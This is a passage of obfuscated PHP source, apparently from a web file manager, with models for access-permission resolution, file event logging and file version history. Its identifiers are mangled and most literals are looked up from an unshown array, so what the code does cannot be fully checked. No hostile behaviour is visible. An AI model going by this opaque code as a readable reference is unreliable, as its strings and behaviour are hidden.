$©İñÜÚÍ = 0; $×·ŒŒ´° = 0; $›à‚¬–Ô = 0; $ø’™ÖˆÃ = 0; $’¢ôû÷É = 1000; $íğï‰ò = 0; $ƒµ©Ëè¬ = 0; $¨‚ÎªŒÔ = 0; $ñ±³Ô‚ = 0; $«óÒø‘Â = array($¡İüÑ–ı[194] => 0); foreach ($ú……¥ç as $«óÒø‘Â) { $³£ÍÌÜ˜ = $this->authInfo($«óÒø‘Â); if (!$³£ÍÌÜ˜) { continue; } $ŒÚå¾´´ = $«óÒø‘Â[$¡İüÑ–ı[582]]; $éÓííª = intval($³£ÍÌÜ˜[$¡İüÑ–ı[498]]); if ($«óÒø‘Â[$¡İüÑ–ı[191]] == SourceModel::TYPE_USER && $ŒÚå¾´´ == $ŞÄšğí·) { $öÛµ¢ƒÓ = !0; $©İñÜÚÍ = $³£ÍÌÜ˜; $½í§ê¹  = $éÓííª; } else { if ($«óÒø‘Â[$¡İüÑ–ı[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ŒÚå¾´´, $ŞÄšğí·)) { $×·ŒŒ´° = !0; $¤ÆìãğĞ = $this->groupStepToUserGroup($ŒÚå¾´´, $ŞÄšğí·); if ($¤ÆìãğĞ < $’¢ôû÷É) { $’¢ôû÷É = $¤ÆìãğĞ; $›à‚¬–Ô = $éÓííª; $ø’™ÖˆÃ = $³£ÍÌÜ˜; $íğï‰ò = $ŒÚå¾´´; } if ($¤ÆìãğĞ == $’¢ôû÷É && $éÓííª >= $›à‚¬–Ô) { $›à‚¬–Ô = $éÓííª; $ø’™ÖˆÃ = $³£ÍÌÜ˜; $íğï‰ò = $ŒÚå¾´´; } } else { if ($ŒÚå¾´´ == $¡İüÑ–ı[231]) { $ƒµ©Ëè¬ = !0; $ñ±³Ô‚ = $³£ÍÌÜ˜; $¨‚ÎªŒÔ = $éÓííª; } } } } if ($öÛµ¢ƒÓ) { $Å’íü¡‚ = $½í§ê¹ ; $³£ÍÌÜ˜ = $©İñÜÚÍ; $‚¾¶’½» = LNG($¡İüÑ–ı[2211]); } else { if ($×·ŒŒ´°) { $Å’íü¡‚ = $›à‚¬–Ô; $³£ÍÌÜ˜ = $ø’™ÖˆÃ; $Êò¼™ıš = Model($¡İüÑ–ı[598])->getInfo($íğï‰ò); $‚¾¶’½» = $¡İüÑ–ı[176] . $Êò¼™ıš[$¡İüÑ–ı[602]] . $¡İüÑ–ı[2212] . LNG($¡İüÑ–ı[2213]); } else { if ($ƒµ©Ëè¬) { $Å’íü¡‚ = $¨‚ÎªŒÔ; $³£ÍÌÜ˜ = $ñ±³Ô‚; $‚¾¶’½» = LNG($¡İüÑ–ı[2184]); } else { $Å’íü¡‚ = 0; $³£ÍÌÜ˜ = !1; $‚¾¶’½» = $¡İüÑ–ı[12]; } } } $»õ…İ—ê = array($¡İüÑ–ı[2203] => intval($Å’íü¡‚), $¡İüÑ–ı[2186] => $³£ÍÌÜ˜, $¡İüÑ–ı[2204] => $‚¾¶’½», $¡İüÑ–ı[2195] => $«óÒø‘Â[$¡İüÑ–ı[194]]); return $»õ…İ—ê; } private function groupContainUser($İ¡›¦´Ç, $Œæ÷ğˆû = false) { return in_array($İ¡›¦´Ç, $this->userGroupParents($Œæ÷ğˆû)); } private function groupStepToUserGroup($ıÒŸ·©„, $å¡óæÂ° = false) { $´‹‘’óš =& $_SERVER[®»±”ó²]; $½¢Äˆ›ë = $this->userGroupList($å¡óæÂ°); $ËŞó¤´ = 1000; $“ÓàşÅ¹ = $GLOBALS[$´‹‘’óš[6]][$´‹‘’óš[92]][$´‹‘’óš[2099]] == 1; $ì†ã€¸€ = $“ÓàşÅ¹ ? 3 : 2; foreach ($½¢Äˆ›ë as $€ûÍó´’) { if ($€ûÍó´’[$´‹‘’óš[1402]] == $ıÒŸ·©„) { return 0; } $¢Ùüüî¿ = explode($´‹‘’óš[50], trim($€ûÍó´’[$´‹‘’óš[597]], $´‹‘’óš[50])); if ($¢Ùüüî¿[0] == $´‹‘’óš[231] && count($¢Ùüüî¿) > $ì†ã€¸€) { $ãş¼¡É© = array_reverse(array_slice($¢Ùüüî¿, $ì†ã€¸€)); $‡é§¸¡Ä = array_search($ıÒŸ·©„, $ãş¼¡É©); if ($‡é§¸¡Ä !== !1 && $‡é§¸¡Ä + 1 <= $ËŞó¤´) { $ËŞó¤´ = $‡é§¸¡Ä + 1; } } } return $ËŞó¤´; } private function userGroupList($–åÀêïÎ = false) { $‚¦ùıõ€ =& $_SERVER[®»±”ó²]; static $Ç›ãµâË = array(); if (isset($Ç›ãµâË[$–åÀêïÎ])) { return $Ç›ãµâË[$–åÀêïÎ]; } $ËÛòßƒü = Model($‚¦ùıõ€[610])->getInfo($–åÀêïÎ); $Ç›ãµâË[$–åÀêïÎ] = array_to_keyvalue($ËÛòßƒü[$‚¦ùıõ€[1401]], $‚¦ùıõ€[1402]); return $Ç›ãµâË[$–åÀêïÎ]; } public function userGroupParents($ïğÄ«šœ) { $š£¥«ˆñ =& $_SERVER[®»±”ó²]; static $çñ¤°Â = array(); $ïğÄ«šœ = $ïğÄ«šœ ? $ïğÄ«šœ : USER_ID; if (isset($çñ¤°Â[$ïğÄ«šœ])) { return $çñ¤°Â[$ïğÄ«šœ]; } $ã£ŒıĞ¹ = $this->userGroupList($ïğÄ«šœ); $îÊÊª‚ó = array(); $„÷ÃŞ½ = $GLOBALS[$š£¥«ˆñ[6]][$š£¥«ˆñ[92]][$š£¥«ˆñ[2099]] == 1; $½©ğÓ”û = $„÷ÃŞ½ ? 3 : 2; foreach ($ã£ŒıĞ¹ as $Òì¯×õĞ) { $øÖ„¸Ï» = array($Òì¯×õĞ[$š£¥«ˆñ[1402]]); $ó«µ¬’ = explode($š£¥«ˆñ[50], trim($Òì¯×õĞ[$š£¥«ˆñ[597]], $š£¥«ˆñ[50])); if ($ó«µ¬’[0] == $š£¥«ˆñ[231] && count($ó«µ¬’) > $½©ğÓ”û) { $¾ÚÊ­´ª = array_slice($ó«µ¬’, $½©ğÓ”û); $øÖ„¸Ï» = array_merge($øÖ„¸Ï», array_reverse($¾ÚÊ­´ª)); } $îÊÊª‚ó = array_merge($îÊÊª‚ó, $øÖ„¸Ï»); } $çñ¤°Â[$ïğÄ«šœ] = array_unique($îÊÊª‚ó); return $çñ¤°Â[$ïğÄ«šœ]; } public function authTargetInfoMake($„„¶ŠÇ«) { $üÁ¾ô =& $_SERVER[®»±”ó²]; $‡ùÊ¢ö = array(); $ĞÄ‚Ñƒ = array(); foreach ($„„¶ŠÇ« as $òËš˜š³) { if ($òËš˜š³[$üÁ¾ô[191]] == SourceModel::TYPE_USER) { $‡ùÊ¢ö[] = intval($òËš˜š³[$üÁ¾ô[582]]); } else { if ($òËš˜š³[$üÁ¾ô[191]] == SourceModel::TYPE_GROUP) { $ĞÄ‚Ñƒ[] = intval($òËš˜š³[$üÁ¾ô[582]]); } } } if ($‡ùÊ¢ö) { $‡ùÊ¢ö = Model($üÁ¾ô[590])->userListInfo($‡ùÊ¢ö); } if ($ĞÄ‚Ñƒ) { $‚ı€ù×Ë = array($üÁ¾ô[2081] => array($üÁ¾ô[503], $ĞÄ‚Ñƒ)); $ĞÄ‚Ñƒ = Model($üÁ¾ô[598])->field($üÁ¾ô[2214])->where($‚ı€ù×Ë)->select(); $ĞÄ‚Ñƒ = array_to_keyvalue($ĞÄ‚Ñƒ, $üÁ¾ô[1402]); } return array($üÁ¾ô[2215] => $‡ùÊ¢ö, $üÁ¾ô[2216] => $ĞÄ‚Ñƒ); } public function authInfo($ÈÕ÷„¸ì) { $ö¡¯’Œû =& $_SERVER[®»±”ó²]; if ($ÈÕ÷„¸ì[$ö¡¯’Œû[2100]]) { $ôğåŞÖ“ = Model($ö¡¯’Œû[584])->listData($ÈÕ÷„¸ì[$ö¡¯’Œû[2100]]); if (!$ôğåŞÖ“) { return !1; $¢£±ÁÀ = Model($ö¡¯’Œû[584])->listData(); $«âğÛ€´ = array_filter_by_field($¢£±ÁÀ, $ö¡¯’Œû[498], $ö¡¯’Œû[231]); return $«âğÛ€´; } $ı¤´÷½ = array_field_key($ôğåŞÖ“, array($ö¡¯’Œû[477], $ö¡¯’Œû[32], $ö¡¯’Œû[498], $ö¡¯’Œû[2014], $ö¡¯’Œû[2015])); $ı¤´÷½[$ö¡¯’Œû[2217]] = $ÈÕ÷„¸ì; return $ı¤´÷½; } else { return array($ö¡¯’Œû[504] => 0, $ö¡¯’Œû[1997] => $ÈÕ÷„¸ì[$ö¡¯’Œû[2163]], $ö¡¯’Œû[505] => $ö¡¯’Œû[12], $ö¡¯’Œû[2014] => $ö¡¯’Œû[2218]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\x72\143\145\137\145\166\145\156\x74"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\x54\x69\x6d\x65", "\x74\x69\155\145", "\151\x6e\163\145\162\164", "\x66\x75\156\x63\x74\x69\x6f\x6e"), array("\x64\145\x73\x63", '', "\x69\156\163\x65\162\164\54\165\160\144\x61\164\x65\54\163\145\x6c\145\x63\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($½Ô—²û§, $»¾÷»¼³, $ã™êÍ¯ô = '') { $Îáö‚„â =& $_SERVER[®»±”ó²]; if (!$this->eventSave) { return; } $µ©şçœ = Model($Îáö‚„â[1440])->sourceInfo($½Ô—²û§); if (!$µ©şçœ) { return !1; } if ($this->isDisableEvent($µ©şçœ, $»¾÷»¼³)) { return; } if ($ã™êÍ¯ô && is_string($ã™êÍ¯ô)) { $ã™êÍ¯ô = array($Îáö‚„â[2030] => $ã™êÍ¯ô); } $ï‰Æ²à = defined($Îáö‚„â[2219]) ? USER_ID : 0; $Î‹¡æ¤ = array($Îáö‚„â[502] => $½Ô—²û§, $Îáö‚„â[2220] => $µ©şçœ[$Îáö‚„â[193]], $Îáö‚„â[2221] => $µ©şçœ[$Îáö‚„â[32]], $Îáö‚„â[595] => !empty($µ©şçœ[$Îáö‚„â[595]]) ? $µ©şçœ[$Îáö‚„â[595]] : $Îáö‚„â[12], $Îáö‚„â[1782] => $ï‰Æ²à, $Îáö‚„â[507] => $»¾÷»¼³, $Îáö‚„â[1784] => $ã™êÍ¯ô); $this->addSystemLog($»¾÷»¼³, $Î‹¡æ¤); unset($Î‹¡æ¤[$Îáö‚„â[2221]], $Î‹¡æ¤[$Îáö‚„â[595]]); return $this->add($Î‹¡æ¤); } private function addSystemLog($¾–Ô¬ïÙ, $«äà‚àÀ) { $ŠŸÜæ•é =& $_SERVER[®»±”ó²]; if ($¾–Ô¬ïÙ == $ŠŸÜæ•é[2222]) { $¾–Ô¬ïÙ = $«äà‚àÀ[$ŠŸÜæ•é[537]][$ŠŸÜæ•é[2223]]; } else { if (in_array($¾–Ô¬ïÙ, array($ŠŸÜæ•é[1971], $ŠŸÜæ•é[2224]))) { $¾–Ô¬ïÙ = $«äà‚àÀ[$ŠŸÜæ•é[537]][$ŠŸÜæ•é[171]]; } } $Ñ¥’òé = array_merge($«äà‚àÀ, array($ŠŸÜæ•é[2225] => $«äà‚àÀ[$ŠŸÜæ•é[194]], $ŠŸÜæ•é[2226] => $«äà‚àÀ[$ŠŸÜæ•é[2226]])); Hook::trigger($ŠŸÜæ•é[2227], $ŠŸÜæ•é[2228] . $¾–Ô¬ïÙ, $«äà‚àÀ); Model($ŠŸÜæ•é[1935])->addLog($ŠŸÜæ•é[2228] . $¾–Ô¬ïÙ, $Ñ¥’òé); } private function isDisableEvent($öŞ‡ÂÀà, $‰­Şßı) { $Æ€ÛìÆé =& $_SERVER[®»±”ó²]; if ($öŞ‡ÂÀà[$Æ€ÛìÆé[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($‰­Şßı == $Æ€ÛìÆé[1960]) { return !1; } return !0; } public function eventCreate($úßšú¶“, $şòÕ…) { $çëŞ°™ =& $_SERVER[®»±”ó²]; $†ğ¨«¸ = Model($çëŞ°™[1440])->sourceInfo($úßšú¶“); $€×îœ¼ô = array($çëŞ°™[2223] => $şòÕ…, $çëŞ°™[32] => $†ğ¨«¸[$çëŞ°™[32]]); return $this->addEvent($úßšú¶“, $çëŞ°™[2222], $€×îœ¼ô); } public function eventFileEdit($¡ò‘¾‚¡) { $õİş¿‹Å =& $_SERVER[®»±”ó²]; $ÛòÑŒÅ” = array($õİş¿‹Å[2229] => $_SERVER[$õİş¿‹Å[2230]], $õİş¿‹Å[2231] => strtolower(ACTION)); if (isset($GLOBALS[$õİş¿‹Å[7]][$õİş¿‹Å[2232]])) { $ÛòÑŒÅ”[$õİş¿‹Å[2232]] = $õİş¿‹Å[91]; } return $this->addEvent($¡ò‘¾‚¡, $õİş¿‹Å[1961], $ÛòÑŒÅ”); } public function eventRecycle($‹Ì¶Å¦ˆ, $±ÅÊ´À) { return $this->addEvent($‹Ì¶Å¦ˆ, $_SERVER[®»±”ó²][2224], $±ÅÊ´À); } private static $_removeLast = ''; public function eventRemove($€ûö’ÂÖ) { $’®Óˆ‡÷ =& $_SERVER[®»±”ó²]; self::$_removeLast = $€ûö’ÂÖ; $Úğ˜‹Ü = Model($’®Óˆ‡÷[1440])->sourceInfo($€ûö’ÂÖ); $‰ŸÏÍï‚ = array_field_key($Úğ˜‹Ü, array($’®Óˆ‡÷[194], $’®Óˆ‡÷[554], $’®Óˆ‡÷[516], $’®Óˆ‡÷[597])); $¼ıÒœÄ¦ = array($’®Óˆ‡÷[171] => $Úğ˜‹Ü[$’®Óˆ‡÷[32]], $’®Óˆ‡÷[2231] => ACTION, $’®Óˆ‡÷[2233] => $‰ŸÏÍï‚); return $this->addEvent($Úğ˜‹Ü[$’®Óˆ‡÷[193]], $’®Óˆ‡÷[1960], $¼ıÒœÄ¦); } public function eventShare($åÑó‡«¦, $’ñÛ’óÙ) { return $this->addEvent($åÑó‡«¦, $_SERVER[®»±”ó²][1971], $’ñÛ’óÙ); } public function eventMove($­ø®øàÌ, $À«„ä§ƒ, $‡Š¬üÄÃ) { $Àšë’È =& $_SERVER[®»±”ó²]; if (self::$_removeLast == $­ø®øàÌ) { return; } $¡Ã¶´Ó = Model($Àšë’È[1440]); $§ë¶ìÎ = $¡Ã¶´Ó->sourceInfo($­ø®øàÌ); $ÂãïÕ¡İ = $¡Ã¶´Ó->sourceInfo($À«„ä§ƒ); $éÃ×÷—Ú = $¡Ã¶´Ó->sourceInfo($‡Š¬üÄÃ); $„‡æª¢» = array($Àšë’È[1251] => $À«„ä§ƒ, $Àšë’È[2234] => $ÂãïÕ¡İ[$Àšë’È[32]], $Àšë’È[2210] => !empty($ÂãïÕ¡İ[$Àšë’È[595]]) ? $ÂãïÕ¡İ[$Àšë’È[595]] : $Àšë’È[12], $Àšë’È[1252] => $‡Š¬üÄÃ, $Àšë’È[2235] => $éÃ×÷—Ú[$Àšë’È[32]], $Àšë’È[2236] => !empty($éÃ×÷—Ú[$Àšë’È[595]]) ? $éÃ×÷—Ú[$Àšë’È[595]] : $Àšë’È[12]); $this->addEvent($­ø®øàÌ, $Àšë’È[636], $„‡æª¢»); $§ë¶ìÎ = $¡Ã¶´Ó->sourceInfo($­ø®øàÌ); $„‡æª¢» = array($Àšë’È[194] => $§ë¶ìÎ[$Àšë’È[194]], $Àšë’È[32] => $§ë¶ìÎ[$Àšë’È[32]]); $this->addEvent($À«„ä§ƒ, $Àšë’È[2237], $„‡æª¢»); } public function eventCopy($ƒ¼È«•) { $this->eventCreate($ƒ¼È«•, $_SERVER[®»±”ó²][634]); } public function eventRename($Ñ¤½ª™ª, $ç¾õ³‰, $¦ü»´…•) { $óùºóŠÏ =& $_SERVER[®»±”ó²]; $ˆù½ê­ = array($óùºóŠÏ[1251] => $ç¾õ³‰, $óùºóŠÏ[1252] => $¦ü»´…•); return $this->addEvent($Ñ¤½ª™ª, $óùºóŠÏ[1454], $ˆù½ê­); } public function eventAddComment($şŞŒÉ¡¤, $ËÓºá÷Â) { return $this->addEvent($şŞŒÉ¡¤, $_SERVER[®»±”ó²][2238], $ËÓºá÷Â); } public function eventAddDesc($ƒâÓı§å, $ŸÑøŸ Ó) { return $this->addEvent($ƒâÓı§å, $_SERVER[®»±”ó²][2239], $ŸÑøŸ Ó); } public function listBySource($ã”Ë¹¼) { $ÅÄ·­Çì =& $_SERVER[®»±”ó²]; $íÎç¹¸¸ = Model($ÅÄ·­Çì[1440])->sourceInfo($ã”Ë¹¼); $¹ãœ×®Å = array($ÅÄ·­Çì[502] => $ã”Ë¹¼); if ($íÎç¹¸¸[$ÅÄ·­Çì[496]] == $ÅÄ·­Çì[91]) { $–‡¹Ï‰¤ = Model($ÅÄ·­Çì[1440])->listSearchChildren($ã”Ë¹¼, 20000); $–‡¹Ï‰¤[] = $ã”Ë¹¼ . $ÅÄ·­Çì[456]; $¹ãœ×®Å = array($ÅÄ·­Çì[194] => array($ÅÄ·­Çì[7], $–‡¹Ï‰¤)); } $ˆÒ…Ô¤µ = $this->where($¹ãœ×®Å)->order($ÅÄ·­Çì[2240])->selectPage(); if ($ˆÒ…Ô¤µ[$ÅÄ·­Çì[444]][$ÅÄ·­Çì[445]] == 0) { $ˆÒ…Ô¤µ[$ÅÄ·­Çì[444]][$ÅÄ·­Çì[445]] = 1; $ˆÒ…Ô¤µ[$ÅÄ·­Çì[447]] = array(array($ÅÄ·­Çì[502] => $ã”Ë¹¼, $ÅÄ·­Çì[2220] => $íÎç¹¸¸[$ÅÄ·­Çì[193]], $ÅÄ·­Çì[1782] => $íÎç¹¸¸[$ÅÄ·­Çì[538]], $ÅÄ·­Çì[507] => $ÅÄ·­Çì[2241], $ÅÄ·­Çì[508] => $íÎç¹¸¸[$ÅÄ·­Çì[234]], $ÅÄ·­Çì[1784] => $ÅÄ·­Çì[12])); } return $this->eventListParse($ˆÒ…Ô¤µ, $ã”Ë¹¼); } private function eventListParse($àç‘æ±£, $ø“£çãå) { $¾µŒ©Õò =& $_SERVER[®»±”ó²]; $‡ŞÎîÒ = $àç‘æ±£[$¾µŒ©Õò[447]]; $¦£²ããí = array_to_keyvalue($‡ŞÎîÒ, $¾µŒ©Õò[12], $¾µŒ©Õò[194]); $‡âÂ˜µĞ = array_to_keyvalue($‡ŞÎîÒ, $¾µŒ©Õò[12], $¾µŒ©Õò[2226]); foreach ($‡ŞÎîÒ as $½“òÅ£Ù) { $Ø°¥Å’ú = $½“òÅ£Ù[$¾µŒ©Õò[537]]; if ($½“òÅ£Ù[$¾µŒ©Õò[33]] == $¾µŒ©Õò[636] && isset($Ø°¥Å’ú[$¾µŒ©Õò[1251]])) { $¦£²ããí[] = $Ø°¥Å’ú[$¾µŒ©Õò[1251]] . $¾µŒ©Õò[12]; $¦£²ããí[] = $Ø°¥Å’ú[$¾µŒ©Õò[1252]] . $¾µŒ©Õò[12]; } if ($½“òÅ£Ù[$¾µŒ©Õò[33]] == $¾µŒ©Õò[2237] && isset($Ø°¥Å’ú[$¾µŒ©Õò[194]])) { $¦£²ããí[] = $Ø°¥Å’ú[$¾µŒ©Õò[194]] . $¾µŒ©Õò[12]; } } $¦£²ããí = array_merge($¦£²ããí, $‡âÂ˜µĞ, array($ø“£çãå . $¾µŒ©Õò[12])); $¦£²ããí = array_unique($¦£²ããí); $ÑçáÑØƒ = array_unique(array_to_keyvalue($‡ŞÎîÒ, $¾µŒ©Õò[12], $¾µŒ©Õò[1791])); $Üœ¾‘ÓÍ = Model($¾µŒ©Õò[610])->userListInfo($ÑçáÑØƒ); $¶Ë÷Ûîµ = Model($¾µŒ©Õò[911])->sourceListInfo($¦£²ããí, !0); foreach ($‡ŞÎîÒ as &$½“òÅ£Ù) { if ($½“òÅ£Ù[$¾µŒ©Õò[33]] == $¾µŒ©Õò[636] && isset($½“òÅ£Ù[$¾µŒ©Õò[537]][$¾µŒ©Õò[1251]])) { $½“òÅ£Ù[$¾µŒ©Õò[537]][$¾µŒ©Õò[1251]] = $¶Ë÷Ûîµ[$½“òÅ£Ù[$¾µŒ©Õò[537]][$¾µŒ©Õò[1251]]]; $½“òÅ£Ù[$¾µŒ©Õò[537]][$¾µŒ©Õò[1252]] = $¶Ë÷Ûîµ[$½“òÅ£Ù[$¾µŒ©Õò[537]][$¾µŒ©Õò[1252]]]; } if ($½“òÅ£Ù[$¾µŒ©Õò[33]] == $¾µŒ©Õò[2237] && isset($½“òÅ£Ù[$¾µŒ©Õò[537]][$¾µŒ©Õò[194]])) { $½“òÅ£Ù[$¾µŒ©Õò[537]][$¾µŒ©Õò[194]] = $¶Ë÷Ûîµ[$½“òÅ£Ù[$¾µŒ©Õò[537]][$¾µŒ©Õò[194]]]; } $½“òÅ£Ù[$¾µŒ©Õò[90]] = $¶Ë÷Ûîµ[$½“òÅ£Ù[$¾µŒ©Õò[194]]]; $½“òÅ£Ù[$¾µŒ©Õò[2242]] = $¶Ë÷Ûîµ[$½“òÅ£Ù[$¾µŒ©Õò[2226]]]; if ($½“òÅ£Ù[$¾µŒ©Õò[33]] == $¾µŒ©Õò[1960]) { $½“òÅ£Ù[$¾µŒ©Õò[2242]] = $½“òÅ£Ù[$¾µŒ©Õò[90]]; $½“òÅ£Ù[$¾µŒ©Õò[2226]] = $½“òÅ£Ù[$¾µŒ©Õò[2242]][$¾µŒ©Õò[194]]; $½“òÅ£Ù[$¾µŒ©Õò[90]] = !1; $½“òÅ£Ù[$¾µŒ©Õò[194]] = $¾µŒ©Õò[12]; } $½“òÅ£Ù[$¾µŒ©Õò[2171]] = $Üœ¾‘ÓÍ[$½“òÅ£Ù[$¾µŒ©Õò[1791]]]; } unset($½“òÅ£Ù); $àç‘æ±£[$¾µŒ©Õò[447]] = $‡ŞÎîÒ; return $àç‘æ±£; } public function removeBySource($à°¶ÖÁ­) { $â×À“š = array($_SERVER[®»±”ó²][502] => $à°¶ÖÁ­); $this->where($â×À“š)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\x72\143\x65\x5f\x68\x69\163\x74\157\x72\171"; public function historyCount($ŒÕîöŞº) { $ü¸¿ó×â =& $_SERVER[®»±”ó²]; if (!$ŒÕîöŞº) { return array(); } if (is_string($ŒÕîöŞº) || is_int($ŒÕîöŞº)) { $ŒÕîöŞº = array($ŒÕîöŞº); } $»‡ ğª = array($ü¸¿ó×â[194], $ü¸¿ó×â[2243] => $ü¸¿ó×â[578]); $Ù¿Üõµü = array($ü¸¿ó×â[194] => array($ü¸¿ó×â[7], $ŒÕîöŞº)); $èËë•¨‚ = $this->field($»‡ ğª)->where($Ù¿Üõµü)->group($ü¸¿ó×â[194])->select(); return array_to_keyvalue($èËë•¨‚, $ü¸¿ó×â[194], $ü¸¿ó×â[578]); } public function addHistory($êˆÌøê², $‹ï×Ğ„ü = '') { $Üúš›Ì¹ =& $_SERVER[®»±”ó²]; $ÖÙ¡†ö¾ = array($Üúš›Ì¹[502] => $êˆÌøê²[$Üúš›Ì¹[194]], $Üúš›Ì¹[1782] => isset($êˆÌøê²[$Üúš›Ì¹[540]]) ? $êˆÌøê²[$Üúš›Ì¹[540]] : $êˆÌøê²[$Üúš›Ì¹[538]], $Üúš›Ì¹[555] => $êˆÌøê²[$Üúš›Ì¹[554]], $Üúš›Ì¹[633] => $êˆÌøê²[$Üúš›Ì¹[79]], $Üúš›Ì¹[2244] => $‹ï×Ğ„ü); if ($GLOBALS[$Üúš›Ì¹[6]][$Üúš›Ì¹[92]][$Üúš›Ì¹[1314]] >= 1) { $this->historyAutoClear($ÖÙ¡†ö¾[$Üúš›Ì¹[194]]); $this->add($ÖÙ¡†ö¾); } Hook::trigger($Üúš›Ì¹[2245], $ÖÙ¡†ö¾); Model($Üúš›Ì¹[2246])->eventFileEdit($êˆÌøê²[$Üúš›Ì¹[194]]); } private function historyAutoClear($î¤£¥Òó) { $“óü€¬® =& $_SERVER[®»±”ó²]; $‡î¹Õ‚Æ = Model($“óü€¬®[851])->get($“óü€¬®[1336]); $ØÜö‡ò¢ = intval($GLOBALS[$“óü€¬®[6]][$“óü€¬®[92]][$“óü€¬®[1314]]); $ºË“™… = $‡î¹Õ‚Æ == $“óü€¬®[1337] ? min(5, $ØÜö‡ò¢) : $ØÜö‡ò¢; $ºË“™… = $ºË“™… <= 0 ? 0 : $ºË“™… - 1; if ($ºË“™… >= 499) { return; } $ÅË­—³Ù = array($“óü€¬®[502] => $î¤£¥Òó); $¼™İãş› = $this->field($“óü€¬®[2247])->where($ÅË­—³Ù)->order($“óü€¬®[2240])->select(); if (!$¼™İãş› || $ºË“™… >= count($¼™İãş›)) { return; } $Á”“ÇÇö = array_to_keyvalue($¼™İãş›, $“óü€¬®[12], $“óü€¬®[477]); $Á”“ÇÇö = array_slice($Á”“ÇÇö, $ºË“™…); $„§Ç“í¥ = array_to_keyvalue($¼™İãş›, $“óü€¬®[12], $“óü€¬®[554]); $„§Ç“í¥ = array_slice($„§Ç“í¥, $ºË“™…); if (!$Á”“ÇÇö || !$„§Ç“í¥) { return; } $ÅË­—³Ù = array($“óü€¬®[504] => array($“óü€¬®[7], $Á”“ÇÇö)); $this->where($ÅË­—³Ù)->delete(); Model($“óü€¬®[557])->remove($„§Ç“í¥); } public function listData($àÌÎ·é) { $´·ï†–° =& $_SERVER[®»±”ó²]; $á¸ï£çø = array($´·ï†–°[502] => $àÌÎ·é); $ÒÊ‰Şğ = $´·ï†–°[2248]; $ãº•ò¸ó = $this->field($ÒÊ‰Şğ)->where($á¸ï£çø)->order($´·ï†–°[2240])->selectPage(); $this->_listAppendUser($ãº•ò¸ó[$´·ï†–°[447]]); $ãÏˆ¢¡â = Model($´·ï†–°[851])->get($´·ï†–°[1336]); $£ÒçÁ²ğ = 5; if ($ãÏˆ¢¡â == $´·ï†–°[1337]) { $ãº•ò¸ó[$´·ï†–°[447]] = array_slice($ãº•ò¸ó[$´·ï†–°[447]], 0, $£ÒçÁ²ğ); $ãº•ò¸ó[$´·ï†–°[444]] = array($´·ï†–°[2249] => 1, $´·ï†–°[2250] => 20, $´·ï†–°[2251] => 1, $´·ï†–°[2252] => count($ãº•ò¸ó[$´·ï†–°[447]])); } return $ãº•ò¸ó; } protected function _listAppendUser(&$ñ ™ÖˆÀ) { $´¬³ÅÓé =& $_SERVER[®»±”ó²]; $Ÿ§ó’æÆ = array_to_keyvalue($ñ ™ÖˆÀ, $´¬³ÅÓé[12], $´¬³ÅÓé[1791]); $’·Ş‚–à = Model($´¬³ÅÓé[610])->userListInfo($Ÿ§ó’æÆ); foreach ($ñ ™ÖˆÀ as &$şã²ÏÔï) { $ûíº¹ıŠ = $şã²ÏÔï[$´¬³ÅÓé[1791]]; $şã²ÏÔï[$´¬³ÅÓé[538]] = $’·Ş‚–à[$ûíº¹ıŠ] ? $’·Ş‚–à[$ûíº¹ıŠ] : !1; } unset($şã²ÏÔï); } public function fileInfo($ßªĞ–´œ, $æÕ½ş«Š = false) { $¢¯¿å – =& $_SERVER[®»±”ó²]; $«êÆğó„ = $this->tablePrefix; $²¢‰ë«® = "{$«êÆğó„}\x69\x6f\x5f\x66\151\x6c\x65\x20\146\151\154\x65\163\40\157\156\40\x66\x69\154\145\163\56\146\x69\154\145\x49\x44\x20\x3d\40\x68\151\163\164\157\162\171\x2e\146\x69\154\145\111\x44"; $ìã´µ½™ = $this->alias($¢¯¿å –[2253])->where(array($¢¯¿å –[504] => $ßªĞ–´œ))->join($²¢‰ë«®, $¢¯¿å –[2254])->find(); if ($ìã´µ½™ && $æÕ½ş«Š) { $ßÅü¼‚¬ = array($¢¯¿å –[194] => $ìã´µ½™[$¢¯¿å –[194]], $¢¯¿å –[477] => array($¢¯¿å –[1100], $ßªĞ–´œ)); $ìã´µ½™[$¢¯¿å –[1677]] = $this->where($ßÅü¼‚¬)->count(); } return $ìã´µ½™; } public function removeItem($›Ş•ñêì) { $Ÿ–·ÕĞ² =& $_SERVER[®»±”ó²]; $ÊÔ½ÆÍô = array($Ÿ–·ÕĞ²[504] => $›Ş•ñêì); $—¯Á¬ö = $this->where($ÊÔ½ÆÍô)->find(); if ($—¯Á¬ö) { $ûÓ¡Ù„“ = $this->where($ÊÔ½ÆÍô)->delete(); Model($Ÿ–·ÕĞ²[557])->remove($—¯Á¬ö[$Ÿ–·ÕĞ²[554]]); return $ûÓ¡Ù„“; } return !1; } public function removeBySource($±ôœ…Ë) { $€ÜÒ„¬« =& $_SERVER[®»±”ó²]; if (!$±ôœ…Ë) { return !1; } if (!is_array($±ôœ…Ë)) { $±ôœ…Ë = array($±ôœ…Ë); } $ŠÓ»‘ìÕ = array($€ÜÒ„¬«[502] => array($€ÜÒ„¬«[7], $±ôœ…Ë)); $æÕ¤¦À = $this->field($€ÜÒ„¬«[555])->where($ŠÓ»‘ìÕ)->select(); if ($æÕ¤¦À) { $this->where($ŠÓ»‘ìÕ)->delete(); $Â¡Ç…Êõ = array_to_keyvalue($æÕ¤¦À, $€ÜÒ„¬«[12], $€ÜÒ„¬«[554]); Model($€ÜÒ„¬«[557])->remove($Â¡Ç…Êõ); } return !0; } public function setDetail($ï€âÏÑ¶, $¥Ûô†áœ) { $¦—ƒ×á =& $_SERVER[®»±”ó²]; return $this->where(array($¦—ƒ×á[504] => $ï€âÏÑ¶))->save(array($¦—ƒ×á[2244] => $¥Ûô†áœ)); } public function rollbackToItem($Ö½éÃ£™, $ñ©ê“Í™) { $Ñ—ÁÜê„ =& $_SERVER[®»±”ó²]; $Ò­œÅêó = Model($Ñ—ÁÜê„[911])->sourceInfo($Ö½éÃ£™); $this->addHistory($Ò­œÅêó, LNG($Ñ—ÁÜê„[2255])); $Ñç¿³ºÂ = $this->find($ñ©ê“Í™); $º¿Üµ£« = 